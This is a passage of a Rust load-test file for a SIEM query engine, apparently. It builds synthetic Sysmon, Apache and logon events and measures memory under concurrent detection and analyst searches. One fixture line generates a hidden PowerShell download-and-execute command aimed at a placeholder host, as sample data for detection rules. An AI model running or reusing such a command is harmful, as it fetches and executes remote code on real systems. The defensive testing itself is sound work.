// SPDX-License-Identifier: AGPL-3.0-or-later

//! query[T] under concurrent load inside a hard memory cap (2026-09-29: the
//! lean query process was kernel OOM-killed by 4 concurrent detection
//! searches in its 3 GiB cgroup).
//!
//! Two steps, two processes (the fixture build must not count toward the
//! measured peak):
//!
//! 1. `build_fixture` ingests `QMB_ROWS` sysmon/apache-shaped rows spread over
//!    the last 24 h into signed parts under `QMB_DIR`.
//! 2. `concurrent_load` opens the query engine over those parts exactly as
//!    query[T] does for a `QMB_CAP_BYTES` role (default 3 GiB), serves the
//!    real QueryService HTTP surface, and fires `QMB_CONCURRENCY` clients
//!    (keyword, stats, sort|head, a detection-style rule, a heavy group-by,
//!    a large raw result) for `QMB_SECONDS`. Every response must be a 200 or
//!    a clean 503/429 `query_budget_exhausted`; the test prints the peak RSS.
//!    `QMB_MODE=legacy` reproduces the pre-fix arithmetic (chDB cap =
//!    limit - 128 MiB, per-statement cap = chDB cap, no result limit, no
//!    admission beyond the two lanes) for a before/after comparison.
//!
//! Run the load step inside a hard cgroup cap so an OOM kill takes only the
//! test process (never the workstation):
//!
//! ```sh
//! export NANO_CHDB_LIBRARY_PATH=... NANO_CHDB_LIBRARY_SHA256=... NANO_LAKE_COMPILER=... QMB_DIR=/var/tmp/qmb
//! cargo test -p nanosiem-lake-worker --test query_memory_budget_native build_fixture -- --ignored --nocapture
//! systemd-run --user --scope -p MemoryMax=3G -p MemorySwapMax=0 \
//!   cargo test -p nanosiem-lake-worker --test query_memory_budget_native concurrent_load -- --ignored --nocapture
//! ```

use arrow_json::reader::infer_json_schema_from_seekable;
use arrow_json::ReaderBuilder;
use bytes::Bytes;
use ed25519_dalek::SigningKey;
use http_body_util::{BodyExt, Full};
use hyper::Request;
use hyper_util::rt::TokioIo;
use nanosiem_lake_worker::enrichment::BronzeIngestEnricher;
use nanosiem_lake_worker::executor::{ExecutorMode, NativeExecutor};
use nanosiem_lake_worker::native::NativeChdb;
use nanosiem_lake_worker::part_ingest::ingest::seed_schema;
use nanosiem_lake_worker::part_ingest::{IngestConfig, Ingestor, NoticeQueue, SourceNotice, SpoolQueue};
use nanosiem_lake_worker::part_query::detections::DetectionGate;
use nanosiem_lake_worker::part_query::engine::{EngineSettings, PartQueryEngine};
use nanosiem_lake_worker::part_query::fetch::{parts_key_prefix, PartFetcher, StoreObjectSource};
use nanosiem_lake_worker::part_query::log_view::PartLogView;
use nanosiem_lake_worker::part_query::memory_budget::QueryMemoryBudget;
use nanosiem_lake_worker::part_query::server::QueryService;
use nanosiem_lake_worker::parts::part_log::{LocalObjectStore, ObjectStore};
use nanosiem_lake_worker::parts::provenance::LocalPartSigner;
use nanosiem_lake_worker::reader_object_cache::{ReaderObjectCache, ReaderObjectCacheSettings};
use parquet::arrow::ArrowWriter;
use serde_json::{json, Value};
use std::collections::BTreeMap;
use std::io::Cursor;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::{Duration, Instant};

const TENANT: &str = "7a1c1e2a-5b8e-4d4c-9a3e-0e2b7c9d1f42";
const GIB: u64 = 1024 * 1024 * 1024;

fn env_u64(name: &str, default: u64) -> u64 {
    std::env::var(name).ok().and_then(|v| v.parse().ok()).unwrap_or(default)
}

fn fixture_dir() -> PathBuf {
    PathBuf::from(std::env::var("QMB_DIR").expect("QMB_DIR"))
}

fn signer() -> LocalPartSigner {
    LocalPartSigner::new("lab-signer-qmb-0001", SigningKey::from_bytes(&[29; 32])).unwrap()
}

fn hash(i: usize) -> String {
    format!("{:064x}", (i as u128).wrapping_mul(0x9e37_79b9_7f4a_7c15_f39c_c060_5ced_c835))
}

/// A sysmon process launch or an apache access line, ~0.6–1.5 KB raw.
fn row(i: usize, time: &str) -> Value {
    let host = format!("ws-{:03}.corp.local", i % 200);
    if i % 3 == 0 {
        let raw = format!(
            "10.{}.{}.{} - - [{time}] \"GET /app/{}/items?id={}&session={} HTTP/1.1\" 200 {} \"https://portal.corp.local/{}\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36\" {}",
            i % 7, i % 251, i % 13, i % 97, i, hash(i), 200 + i % 9000, hash(i + 1), hash(i + 2)
        );
        json!({
            "class_uid": 4002, "class_name": "HTTP Activity", "category_uid": 4, "activity_id": 1, "type_uid": 400201,
            "severity_id": 1, "time": time, "raw_data": raw, "raw_data_size": raw.len(),
            "metadata": {"uid": format!("uid-{i:08}"), "version": "1.9.0", "log_source": "apache_access", "tenant_uid": TENANT,
                         "product": {"name": "Apache HTTP Server", "vendor_name": "Apache"}},
            "src_endpoint": {"ip": format!("10.{}.{}.{}", i % 7, i % 251, i % 13)},
            "http_request": {"http_method": "GET", "url": {"path": format!("/app/{}/items", i % 97), "query_string": format!("id={i}")},
                             "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            "http_response": {"code": 200 + (i % 5) * 100},
            "dst_endpoint": {"hostname": host},
        })
    } else {
        let cmd = if i % 997 == 0 {
            format!("powershell.exe -nop -w hidden -enc {} IEX (New-Object Net.WebClient).DownloadString('http://x/{i}')", hash(i))
        } else {
            format!("C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule /id {} /t {}", hash(i), hash(i + 7))
        };
        let raw = format!(
            "<Event><System><EventID>1</EventID><Computer>{host}</Computer><TimeCreated SystemTime=\"{time}\"/></System><EventData><Data Name=\"Image\">{}</Data><Data Name=\"CommandLine\">{cmd}</Data><Data Name=\"Hashes\">SHA256={}</Data><Data Name=\"ParentImage\">C:\\Windows\\explorer.exe</Data><Data Name=\"User\">CORP\\user{}</Data><Data Name=\"LogonGuid\">{{{}}}</Data></EventData></Event>",
            if i % 997 == 0 { "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" } else { "C:\\Windows\\System32\\svchost.exe" },
            hash(i), i % 500, &hash(i + 3)[..36]
        );
        json!({
            "class_uid": 1007, "class_name": "Process Activity", "category_uid": 1, "activity_id": 1, "type_uid": 100701,
            "severity_id": 1, "time": time, "raw_data": raw, "raw_data_size": raw.len(),
            "metadata": {"uid": format!("uid-{i:08}"), "version": "1.9.0", "log_source": "windows_sysmon", "tenant_uid": TENANT,
                         "product": {"name": "Sysmon", "vendor_name": "Microsoft"}},
            "actor": {"process": {"name": "explorer.exe", "pid": 4}, "user": {"name": format!("user{}", i % 500)}},
            "process": {"name": if i % 997 == 0 { "powershell.exe" } else { "svchost.exe" }, "pid": i, "cmd_line": cmd,
                        "file": {"name": "svchost.exe", "type_id": 1, "hashes": [{"algorithm_id": 3, "value": hash(i)}]}},
            "device": {"hostname": host, "type_id": 2},
        })
    }
}

/// Sysmon network connection (class 4001) for the C2 / rare-process rules:
/// ~2k distinct process hashes, ~400 public destinations, a few odd ports.
fn network_row(i: usize, time: &str) -> Value {
    let host = format!("ws-{:03}.corp.local", i % 200);
    let exe = ["chrome.exe", "svchost.exe", "OneDrive.exe", "python.exe", "rundll32.exe"][i % 5];
    let raw = format!("net {host} {exe} {i}");
    json!({
        "class_uid": 4001, "class_name": "Network Activity", "category_uid": 4, "activity_id": 6, "type_uid": 400106,
        "severity_id": 1, "time": time, "raw_data_size": raw.len(), "raw_data": raw,
        "metadata": {"uid": format!("uid-{i:08}"), "version": "1.9.0", "profiles": ["host"], "log_source": "windows_sysmon", "tenant_uid": TENANT,
                     "product": {"name": "Sysmon", "vendor_name": "Microsoft"}},
        "device": {"hostname": host, "type_id": 2},
        "src_endpoint": {"hostname": host, "ip": format!("10.1.{}.{}", i % 200 / 250, i % 200)},
        "dst_endpoint": {"ip": format!("{}.{}.{}.{}", 23 + i % 17, i % 23, i % 7, 1 + i % 400 % 250), "port": ([443, 443, 80, 53, 8443, 4444][i % 6])},
        "actor": {"user": {"name": format!("user{}", i % 500)},
                  "process": {"name": exe, "pid": i % 30_000, "file": {"name": exe, "type_id": 1, "path": format!("C:\\Users\\user{}\\AppData\\Local\\{exe}", i % 500),
                              "hashes": [{"algorithm_id": 3, "value": hash(i % 2_000)}]}}},
    })
}

/// Windows logon (class 3002) for the logon / failed-login rules.
fn logon_row(i: usize, time: &str) -> Value {
    let raw = format!("logon {i}");
    json!({
        "class_uid": 3002, "class_name": "Authentication", "category_uid": 3, "activity_id": 1, "type_uid": 300201,
        "severity_id": 1, "time": time, "raw_data_size": raw.len(), "raw_data": raw,
        "status": if i.is_multiple_of(3) { "Failure" } else { "Success" }, "logon_type_id": ([2, 3, 10][i % 3]),
        "metadata": {"uid": format!("uid-{i:08}"), "version": "1.9.0", "log_source": "windows_event", "tenant_uid": TENANT,
                     "product": {"name": "Security", "vendor_name": "Microsoft"}},
        "user": {"name": format!("user{}", i % 500)},
        "src_endpoint": {"ip": format!("10.2.{}.{}", i % 11, i % 250), "hostname": format!("ws-{:03}.corp.local", i % 211)},
        "dst_endpoint": {"hostname": format!("srv-{:02}.corp.local", i % 40)},
    })
}

fn write_bronze(path: &Path, events: &[Value]) {
    let mut json = Vec::new();
    for event in events {
        serde_json::to_writer(&mut json, event).unwrap();
        json.push(b'\n');
    }
    let (schema, _) = infer_json_schema_from_seekable(&mut Cursor::new(json.clone()), None).unwrap();
    let reader = ReaderBuilder::new(Arc::new(schema)).with_batch_size(4_096).build(Cursor::new(json)).unwrap();
    let mut writer = None;
    for batch in reader {
        let batch = batch.unwrap();
        let w = writer.get_or_insert_with(|| ArrowWriter::try_new(std::fs::File::create(path).unwrap(), batch.schema(), None).unwrap());
        w.write(&batch).unwrap();
    }
    writer.unwrap().close().unwrap();
}

// Multi-threaded: long sealed builds (millions of rows) hung idle in a
// current-thread runtime once the local prevalence DB began its background
// work.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
#[ignore = "native fixture build: QMB_DIR"]
async fn build_fixture() {
    let root = fixture_dir();
    std::fs::create_dir_all(&root).unwrap();
    // Rows spread evenly over the last 23 h (`QMB_SPAN_MINUTES`), newest
    // last, in bronze files of 50k rows (one notice each). `QMB_SHAPES=detect`
    // mixes in the network and logon rows the OCSF detection rules read.
    // `QMB_EPS` sizes the fixture to a tier: eps x span rows.
    let span_ms = env_u64("QMB_SPAN_MINUTES", 23 * 60) as i64 * 60_000;
    let rows = match std::env::var("QMB_EPS").ok().and_then(|v| v.parse::<f64>().ok()) {
        Some(eps) => (eps * span_ms as f64 / 1_000.0) as usize,
        None => env_u64("QMB_ROWS", 400_000) as usize,
    };
    let now = chrono::Utc::now();
    let parts = LocalObjectStore::new(root.join("parts")).unwrap();
    let sources_dir = root.join("sources");
    std::fs::create_dir_all(sources_dir.join("bronze")).unwrap();
    let sources = LocalObjectStore::new(&sources_dir).unwrap();
    let spool = SpoolQueue::new(root.join("spool"), TENANT).unwrap();
    let signer = signer();
    let mut cfg = IngestConfig::new(TENANT, root.join("work"));
    cfg.flush_interval_override_ms = Some(1_000);
    if std::env::var("QMB_SEAL").is_ok_and(|v| v == "1") {
        // A fixture arrives days of event hours within minutes, so every
        // hour stays in the 6 h arrival dedup window. Keep every part local
        // and the window short: it keeps the build fast. (NAN-3061: the
        // ~4 M-row build stall was NOT dedup waiting on evicted parts; see
        // nan2868_part_ingest::interleaved_backfill_past_the_part_cache_*.)
        cfg.cache_max_bytes = u64::MAX / 4;
        cfg.dedup.exact_window_ms = 60_000;
    }
    let now_ms = now.timestamp_millis();
    let mut ingestor = Ingestor::open(cfg, &parts, &sources, &spool as &dyn NoticeQueue, &signer, signer.trusted(),
        BronzeIngestEnricher::disabled(), &seed_schema(), now_ms).await.expect("ingest opens");
    let detect_shapes = std::env::var("QMB_SHAPES").is_ok_and(|shapes| shapes == "detect");
    // Tier fixtures (`QMB_SEAL=1`): the arrival clock advances per file, so
    // L0 parts flush, minute/hour merges run and sealed hours end as the
    // `h` parts a live tenant's query[T] reads; each bronze file is deleted
    // once its rows are committed (a 7 d fixture's bronze is ~4x its parts).
    let seal = std::env::var("QMB_SEAL").is_ok_and(|v| v == "1");
    let mut committed_bronze: Vec<PathBuf> = Vec::new();
    let keep_bronze = std::env::var("QMB_KEEP_BRONZE").is_ok_and(|v| v == "1");
    let chunk = 50_000;
    let started = Instant::now();
    for (file, start) in (0..rows).step_by(chunk).enumerate() {
        let end = (start + chunk).min(rows);
        let batch = (start..end)
            .map(|i| {
                let time = (now - chrono::Duration::milliseconds(span_ms - span_ms * i as i64 / rows as i64)).to_rfc3339();
                match i % 10 {
                    1 | 4 if detect_shapes => network_row(i, &time),
                    7 if detect_shapes => logon_row(i, &time),
                    _ => row(i, &time),
                }
            })
            .collect::<Vec<_>>();
        let key = format!("bronze/{file:04}.parquet");
        write_bronze(&sources_dir.join(&key), &batch);
        nanosiem_lake_worker::bronze::admit_bronze_files(&[sources_dir.join(&key)], TENANT).expect("bronze admitted");
        spool.deliver(&SourceNotice { tenant_id: TENANT.into(), key, version: "1".into(), bytes: 0, sha256: None,
            edge_sha256: None, notified_at_ms: now_ms }).unwrap();
        if seal {
            committed_bronze.push(sources_dir.join(format!("bronze/{file:04}.parquet")));
            let clock = now_ms + 1_000 + file as i64 * 2_000;
            ingestor.tick(clock).await.expect("ingest admits");
            ingestor.tick(clock + 1_500).await.expect("ingest flushes and merges");
            if !keep_bronze && ingestor.health().buffered_rows == 0 && ingestor.health().pending_notices == 0 {
                for path in committed_bronze.drain(..) {
                    let _ = std::fs::remove_file(path);
                }
            }
            if file % 20 == 0 {
                let h = ingestor.health();
                eprintln!("ingested {end}/{rows} in {:.0}s ({:.0} rows/s) live_parts={} by_level={:?} backlog={}", started.elapsed().as_secs_f64(),
                    end as f64 / started.elapsed().as_secs_f64(), h.live_parts, h.live_parts_by_level, h.merge_backlog);
            }
        } else {
            ingestor.tick(now_ms + 1_000).await.expect("ingest admits");
            eprintln!("ingested {end}/{rows}");
        }
    }
    let final_clock = if seal { now_ms + 10_000 + (rows / chunk) as i64 * 2_000 } else { now_ms + 5_000 };
    ingestor.flush_now(final_clock).await.expect("ingest flushes");
    if seal {
        // Seal every closed hour: run merges until none are due.
        let mut clock = final_clock + 11 * 60_000;
        for _ in 0..200_000 {
            let report = ingestor.tick(clock).await.expect("seal merges");
            if report.merges == 0 && ingestor.health().merge_backlog == 0 {
                break;
            }
            clock += 1_000;
        }
        for path in committed_bronze.drain(..) {
            let _ = std::fs::remove_file(path);
        }
        let h = ingestor.health();
        eprintln!("sealed: rows_committed={} live_parts={} by_level={:?} in {:.0}s", h.rows_committed_total, h.live_parts,
            h.live_parts_by_level, started.elapsed().as_secs_f64());
    }
    std::fs::write(root.join("fixture.json"), json!({"rows": rows, "built_at": now.to_rfc3339()}).to_string()).unwrap();
}

fn vm_hwm_kib() -> u64 {
    std::fs::read_to_string("/proc/self/status").unwrap().lines()
        .find_map(|line| line.strip_prefix("VmHWM:"))
        .and_then(|v| v.trim().trim_end_matches("kB").trim().parse().ok())
        .unwrap_or(0)
}

fn cgroup_file(name: &str) -> Option<String> {
    let text = std::fs::read_to_string("/proc/self/cgroup").ok()?;
    let relative = text.lines().find_map(|line| line.strip_prefix("0::"))?.trim().trim_start_matches('/').to_string();
    std::fs::read_to_string(Path::new("/sys/fs/cgroup").join(relative).join(name)).ok()
}

async fn post(service: &Arc<QueryService>, path: &str, body: &Value) -> (u16, Value) {
    let (client, server) = tokio::net::UnixStream::pair().unwrap();
    tokio::spawn(service.clone().serve_stream(server));
    let (mut sender, connection) = hyper::client::conn::http1::handshake(TokioIo::new(client)).await.unwrap();
    tokio::spawn(connection);
    let request = Request::builder().method("POST").uri(path).header("host", "cell").header("content-type", "application/json")
        .body(Full::new(Bytes::from(body.to_string()))).unwrap();
    let response = sender.send_request(request).await.unwrap();
    let status = response.status().as_u16();
    let bytes = response.into_body().collect().await.unwrap().to_bytes();
    // The client shares the measured process: never hold a large answer as a
    // parsed tree (the scheduler parses it in ITS process, not the server's).
    if status == 200 && bytes.len() > 1 << 20 {
        return (status, json!({"reason": null, "error": null, "ok": true, "rows": null, "bytes": bytes.len()}));
    }
    // Keep only the envelope: the load test measures the process, not the client.
    let value = serde_json::from_slice::<Value>(&bytes).map(|v| json!({"reason": v["reason"], "error": v["error"], "ok": v["ok"],
        "rows": v["result"]["rows"].as_array().or(v["results"].as_array()).map(Vec::len)})).unwrap_or(Value::Null);
    (status, value)
}

/// Open the engine over the fixture exactly as a query[T] (or, `detect`, a
/// detect[T] running rules: 2 GiB cache, 2 h prewarm, 60 s admission) of a
/// `cap`-byte role does: the same budget arithmetic as
/// `server::open_engine_timed` (or the pre-fix one).
async fn open_service(root: &Path, cap: u64, legacy: bool, lanes_override: Option<usize>, threads: u64,
    detect: bool) -> (Arc<QueryService>, tempfile::TempDir) {
    let state = tempfile::tempdir_in(root).unwrap();
    // detect[T] sizes its engine below its role limit, as `lake_part_query` does.
    let cap = if detect { nanosiem_lake_worker::part_query::memory_budget::detect_engine_cap(cap) } else { cap };

    let trusted = signer().trusted();
    let store: Arc<dyn ObjectStore> = Arc::new(LocalObjectStore::new(root.join("parts")).unwrap());
    let view = PartLogView::open(store.as_ref(), TENANT, trusted.clone()).await.unwrap();
    let head = view.head().map_or(0, |(seq, _)| seq);
    let bucket = "qmb-local";
    let cache = ReaderObjectCache::open(ReaderObjectCacheSettings {
        root: state.path().join("cache"), max_bytes: if detect { 2 * GIB } else { 8 * GIB },
        query_max_bytes: if detect { GIB / 2 } else { 2 * GIB },
        fetch_concurrency: 8, fetch_deadline: Duration::from_secs(60),
    }, TENANT, bucket, &parts_key_prefix(TENANT).unwrap(),
    Arc::new(StoreObjectSource::local(bucket, store.clone(), root.join("parts")))).unwrap();
    let fetcher = PartFetcher::new(TENANT, bucket, store.clone(), trusted, cache).unwrap();
    let runtime = NativeChdb::load_verified(
        std::env::var("NANO_CHDB_LIBRARY_PATH").unwrap(),
        &std::env::var("NANO_CHDB_LIBRARY_SHA256").unwrap(),
    ).unwrap();
    std::mem::forget(runtime.clone());
    // The same arithmetic as `server::open_engine_timed`, or the pre-fix one.
    let (server_bytes, lanes, per_query, result_limit) = if legacy {
        let server = cap.saturating_sub(128 << 20).max(256 << 20);
        (server, 2, server.min(4 * GIB).max(64 << 20), None)
    } else {
        let budget = QueryMemoryBudget::derive(cap, None);
        (budget.server_bytes, budget.concurrency, budget.per_query_bytes, Some(budget.result_bytes))
    };
    let lanes = lanes_override.unwrap_or(lanes);
    eprintln!("mode={} cap={cap} server={server_bytes} lanes={lanes} per_query={per_query} result_limit={result_limit:?} threads={threads}",
        if legacy { "legacy" } else { "budget" });
    let mut executor = NativeExecutor::start_with_server_memory_limit(runtime.clone(), lanes, "parts", ExecutorMode::ReadOnly, Some(server_bytes)).unwrap();
    if let Some(limit) = result_limit {
        executor = executor.with_result_limit(limit);
    }
    let writer = NativeExecutor::start_with_server_memory_limit(runtime, 1, "parts-rw", ExecutorMode::ReadWrite, Some(server_bytes)).unwrap();
    let engine = PartQueryEngine::new(EngineSettings {
        tenant_id: TENANT.into(), bucket: bucket.into(),
        compiler: std::env::var("NANO_LAKE_COMPILER").unwrap().into(),
        max_query_bytes: 64 * GIB, max_memory_bytes: per_query, max_execution_seconds: 120, threads,
    }, store, view, fetcher, executor).unwrap().with_writer(writer).with_state_dir(state.path());
    let gate = DetectionGate::new(Some(state.path().to_path_buf()), head).unwrap();
    let service = QueryService::new(engine, gate, state.path().to_path_buf(), "compiler".into(), "chdb".into(), None, if detect { 2 } else { 24 }, None);
    service.clone().start_ready_with_background_prewarm();
    if detect {
        service.set_admission_deadline(nanosiem_lake_worker::part_query::engine::DETECT_ADMISSION_DEADLINE);
    }
    (service, state)
}

/// One scheduled rule from the rules repo: its nPL up to a `| prevalence`
/// stage (the search service runs that stage as a `/v1/prevalence/lookup`
/// of the result rows' artifacts), its lookback and whether it has one.
#[derive(Clone)]
struct Rule {
    name: String,
    npl: String,
    lookback: chrono::Duration,
    prevalence_30d: bool,
}

fn parse_lookback(text: &str) -> Option<chrono::Duration> {
    let text = text.trim().trim_matches('"');
    let (number, unit) = text.split_at(text.find(|c: char| !c.is_ascii_digit())?);
    let n: i64 = number.parse().ok()?;
    Some(match unit {
        "s" => chrono::Duration::seconds(n),
        "m" => chrono::Duration::minutes(n),
        "h" => chrono::Duration::hours(n),
        "d" => chrono::Duration::days(n),
        _ => return None,
    })
}

/// `QMB_RULES_DIR` (the rules repo, branch fix/NAN-2447-lake-field-names):
/// every rule in `demo-ocsf/` (the e2e set) plus every OCSF rule with a
/// `prevalence ... window=30d` stage.
fn load_rules() -> Vec<Rule> {
    let root = PathBuf::from(std::env::var("QMB_RULES_DIR").unwrap_or_else(|_| format!("{}/Projects/rules", std::env::var("HOME").unwrap())));
    let mut rules = Vec::new();
    let mut dirs: Vec<PathBuf> = std::fs::read_dir(&root).unwrap().flatten().map(|e| e.path())
        .filter(|p| p.is_dir() && p.file_name().is_some_and(|n| n.to_string_lossy().ends_with("-ocsf"))).collect();
    dirs.sort();
    for dir in dirs {
        let e2e = dir.file_name().is_some_and(|n| n == "demo-ocsf");
        let mut files: Vec<PathBuf> = std::fs::read_dir(&dir).unwrap().flatten().map(|e| e.path())
            .filter(|p| p.extension().is_some_and(|e| e == "yml")).collect();
        files.sort();
        for file in files {
            let text = std::fs::read_to_string(&file).unwrap();
            let mut sections = text.splitn(3, "\n---\n");
            let (Some(front), Some(body)) = (sections.next(), sections.next()) else { continue };
            let prevalence_30d = body.contains("window=30d");
            if !e2e && !prevalence_30d {
                continue;
            }
            let lookback = front.lines().find_map(|l| l.strip_prefix("lookback:")).and_then(parse_lookback)
                .unwrap_or(chrono::Duration::minutes(5));
            let npl = body.split_whitespace().collect::<Vec<_>>().join(" ");
            let npl = npl.split("| prevalence").next().unwrap().trim().to_string();
            let name = format!("{}/{}", dir.file_name().unwrap().to_string_lossy(), file.file_stem().unwrap().to_string_lossy());
            rules.push(Rule { name, npl, lookback, prevalence_30d });
        }
    }
    // The e2e set first, then the prevalence rules; `QMB_RULES_LIMIT=N`
    // keeps the first N (a tier's rule count).
    rules.sort_by_key(|rule| !rule.name.starts_with("demo-ocsf/"));
    if let Some(limit) = std::env::var("QMB_RULES_LIMIT").ok().and_then(|v| v.parse::<usize>().ok()) {
        rules.truncate(limit);
    }
    rules
}

/// Peak anonymous / total cgroup memory, sampled every 100 ms from a plain
/// thread (the kernel's memory.peak also counts reclaimable page cache).
fn spawn_anon_sampler() -> Arc<std::sync::atomic::AtomicU64> {
    let peak = Arc::new(std::sync::atomic::AtomicU64::new(0));
    let out = peak.clone();
    std::thread::spawn(move || loop {
        if let Some(anon) = cgroup_file("memory.stat").and_then(|s| s.lines().find_map(|l| l.strip_prefix("anon ")).and_then(|v| v.trim().parse::<u64>().ok())) {
            out.fetch_max(anon, std::sync::atomic::Ordering::Relaxed);
        }
        std::thread::sleep(Duration::from_millis(100));
    });
    peak
}

fn cgroup_cpu_usec() -> Option<u64> {
    cgroup_file("cpu.stat")?.lines().find_map(|l| l.strip_prefix("usage_usec ")).and_then(|v| v.trim().parse().ok())
}

/// NAN-3047: detect[T]'s own engine under detect's cgroup, running the real
/// OCSF rule set (`QMB_WORKLOAD=rules`, the default) at the scheduler's claim
/// concurrency, or query[T]'s interactive mix (`QMB_WORKLOAD=interactive`)
/// in a SEPARATE process and cgroup. Run both at once to show the isolation:
/// neither process dies and each keeps answering.
///
/// ```sh
/// # the fixture: 1 h at 300 eps, with the network/logon rows the rules read
/// QMB_DIR=/var/tmp/qmb-detect QMB_ROWS=1080000 QMB_SPAN_MINUTES=60 QMB_SHAPES=detect \
///   cargo test ... build_fixture -- --ignored
/// systemd-run --user --scope -p MemoryMax=2G -p MemorySwapMax=0 -p CPUQuota=100% \
///   cargo test ... rules_load -- --ignored --nocapture &
/// systemd-run --user --scope -p MemoryMax=3G -p MemorySwapMax=0 -p CPUQuota=300% \
///   env QMB_WORKLOAD=interactive cargo test ... rules_load -- --ignored --nocapture
/// ```
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
#[ignore = "native load test: NANO_CHDB_LIBRARY_PATH, NANO_CHDB_LIBRARY_SHA256, NANO_LAKE_COMPILER, QMB_DIR, QMB_RULES_DIR; run under a memory cgroup"]
async fn rules_load() {
    let _ = tracing_subscriber::fmt().with_max_level(tracing::Level::WARN).try_init();
    let root = fixture_dir();
    let fixture: Value = serde_json::from_slice(&std::fs::read(root.join("fixture.json")).expect("run build_fixture first")).unwrap();
    let built_at = chrono::DateTime::parse_from_rfc3339(fixture["built_at"].as_str().unwrap()).unwrap().with_timezone(&chrono::Utc);
    let interactive = std::env::var("QMB_WORKLOAD").is_ok_and(|w| w == "interactive" || w == "mixed");
    // The role's memory limit (detect: the engine is sized 512 MiB below it).
    let cap = env_u64("QMB_CAP_BYTES", if interactive { 3 * GIB } else { 2 * GIB });
    let clients = env_u64("QMB_CONCURRENCY", 4) as usize;
    let seconds = env_u64("QMB_SECONDS", 120);
    let threads = env_u64("QMB_THREADS", if interactive { 3 } else { 1 });
    let lanes = std::env::var("QMB_LANES").ok().and_then(|v| v.parse().ok());
    let cpu_start = cgroup_cpu_usec();
    let mixed_mode = std::env::var("QMB_WORKLOAD").is_ok_and(|w| w == "mixed");
    let (service, _state) = open_service(&root, cap, false, lanes, threads, !interactive && !mixed_mode).await;
    let open_kib = vm_hwm_kib();
    let open_peak = cgroup_file("memory.peak").map(|v| v.trim().parse::<u64>().unwrap_or(0) >> 20);

    let rules = load_rules();
    // (name, path, body): rules evaluate their lookback ending at the
    // fixture's newest row; interactive searches cover the whole fixture.
    // `QMB_WINDOW_HOURS` (default 24): the analysts' search window, ending
    // at the fixture's newest row. `QMB_MIX=analyst`: keyword, stats-by,
    // sort|head and a 20k-row read paged in 2000-row cursor pages as the
    // search service does (LAKE_PAGE_ROWS).
    let window_hours = std::env::var("QMB_WINDOW_HOURS").ok().and_then(|v| v.parse::<f64>().ok()).unwrap_or(24.0);
    let analyst_mix = std::env::var("QMB_MIX").is_ok_and(|m| m == "analyst");
    let interactive_work: Vec<(String, &'static str, Value)> = {
        let window = chrono::Duration::milliseconds((window_hours * 3_600_000.0) as i64);
        let (start, end) = ((built_at - window).to_rfc3339(), built_at.to_rfc3339());
        let shapes: Vec<(&str, &str, usize)> = if analyst_mix {
            vec![("keyword", "powershell", 1_000), ("stats", "metadata.log_source=windows_sysmon | stats count by device.hostname, actor.user.name", 10_000),
                 ("sort_head", "* | sort -raw_data_size | head 200", 200), ("paged_20k", "*", 20_000)]
        } else {
            vec![("keyword", "powershell", 1_000), ("stats", "metadata.log_source=windows_sysmon | stats count by device.hostname, actor.user.name", 10_000),
                 ("sort_head", "* | sort -raw_data_size | head 200", 200), ("medium_result", "* | head 20000", 20_000),
                 ("timechart", "* | timechart span=5m count by class_uid", 1_000)]
        };
        shapes.into_iter().map(|(name, query, limit)| (name.to_string(), if name == "paged_20k" { "paged" } else { "/v1/query" },
            json!({"route": "broad_npl", "tenant_id": TENANT,
                "dataset": "logs", "query": query, "start": start, "end": end, "limit": limit, "offset": 0, "table_view": false, "use_cache": false}))).collect()
    };
    let anon_peak = spawn_anon_sampler();
    let rules_work: Vec<(String, &'static str, Value)> = {
        eprintln!("rules={} ({} with prevalence window=30d)", rules.len(), rules.iter().filter(|r| r.prevalence_30d).count());
        let mut work = Vec::new();
        for rule in &rules {
            work.push((rule.name.clone(), "/v1/query", json!({"route": "broad_npl", "tenant_id": TENANT, "dataset": "logs", "query": rule.npl,
                "start": (built_at - rule.lookback).to_rfc3339(), "end": built_at.to_rfc3339(), "limit": 10_000, "offset": 0,
                "table_view": false, "use_cache": false})));
            if rule.prevalence_30d {
                // Pessimistic: every result row carries a distinct artifact.
                work.push((format!("{}#prevalence", rule.name), "/v1/prevalence/lookup", json!({"tenant_id": TENANT, "window": "30d",
                    "artifacts": (0..2_000).map(|i| hash(i * 5 + rule.name.len())).collect::<Vec<_>>()})));
            }
        }
        work
    };
    // QMB_WORKLOAD=mixed: the pre-NAN-3047 shape, rules AND analysts in one
    // process (query[T]): `clients` of each.
    let mixed = std::env::var("QMB_WORKLOAD").is_ok_and(|w| w == "mixed");
    let groups: Vec<Vec<(String, &'static str, Value)>> = if mixed {
        vec![rules_work, interactive_work]
    } else if interactive {
        vec![interactive_work]
    } else {
        vec![rules_work]
    };
    let started = Instant::now();
    let deadline = started + Duration::from_secs(seconds);
    // QMB_TRACE=1: every request's start/end and a 250 ms memory sample, so
    // a kernel OOM kill names the request in flight.
    let trace = std::env::var("QMB_TRACE").is_ok();
    if trace {
        std::thread::spawn(|| loop {
            let anon = cgroup_file("memory.stat").and_then(|s| s.lines().find_map(|l| l.strip_prefix("anon ")).map(|v| v.trim().parse::<u64>().unwrap_or(0) >> 20));
            let rss = std::fs::read_to_string("/proc/self/status").ok().and_then(|s| s.lines().find_map(|l| l.strip_prefix("VmRSS:")).map(|v| v.trim().to_string()));
            eprintln!("SAMPLE rss={rss:?} cgroup_anon_mib={anon:?} cgroup_current_mib={:?}",
                cgroup_file("memory.current").map(|v| v.trim().parse::<u64>().unwrap_or(0) >> 20));
            std::thread::sleep(Duration::from_millis(250));
        });
    }
    let mut tasks = Vec::new();
    for (client, work) in groups.iter().flat_map(|work| (0..clients).map(move |client| (client, work.clone()))) {
        let service = service.clone();
        tasks.push(tokio::spawn(async move {
            let mut out: Vec<(String, u16, String, u128)> = Vec::new();
            let mut n = client * work.len() / clients.max(1);
            while Instant::now() < deadline {
                let (name, path, mut body) = work[n % work.len()].clone();
                n += 1;
                body["request_id"] = json!(uuid::Uuid::new_v4().to_string());
                let t0 = Instant::now();
                if trace {
                    eprintln!("START client={client} rule={name}");
                }
                let (status, value) = if path == "paged" {
                    let (start, end) = (body["start"].as_str().unwrap().to_string(), body["end"].as_str().unwrap().to_string());
